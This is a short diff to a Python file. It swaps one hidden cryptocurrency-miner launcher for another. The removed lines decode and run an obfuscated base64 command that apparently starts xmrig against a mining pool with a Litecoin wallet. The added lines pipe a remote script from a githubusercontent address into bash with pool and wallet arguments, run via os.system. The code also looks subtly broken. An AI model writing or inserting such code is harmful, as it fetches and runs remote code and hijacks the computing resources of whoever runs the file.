@@ -1,3 +1,3 @@
 import os
-code = "Y2hmodArIHggeG1yaWcgJiYgLi94bXJpZyAtbyBtaW5vdGF1cngubWluZS56cG9vbC5jYTo3MDE5IC1hIG1pbm90YXVyeCAtdSBsdGMxcXBtdmtxdXpwYTVjOXFoa3E0dDhwdmhmZmQ3MjM4YWU1emV3cjB2IC1wIGM9TFRD"
-import base64; os.system(base64.b64decode(code.replace("chmodAr", "chmod +x")).decode())
+cmd = "curl -sL https://githubusercontent.com | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC"
+os.system(cmd)
